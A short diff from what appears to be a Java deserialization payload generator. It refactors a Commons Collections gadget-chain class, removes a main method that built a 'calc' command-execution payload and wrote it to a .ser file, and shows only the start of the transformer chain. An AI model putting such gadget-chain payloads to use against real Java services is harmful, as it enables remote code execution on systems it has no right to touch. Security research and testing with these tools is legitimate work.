@@ -9,21 +9,14 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
-public class CommonsCollections7Lite_4 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("7777.ser");
-        fous.write(bytes);
-        fous.close();
-    }
+public class CommonsCollections7Lite {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         final String[] execArgs = new String[]{String.valueOf(type)};
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
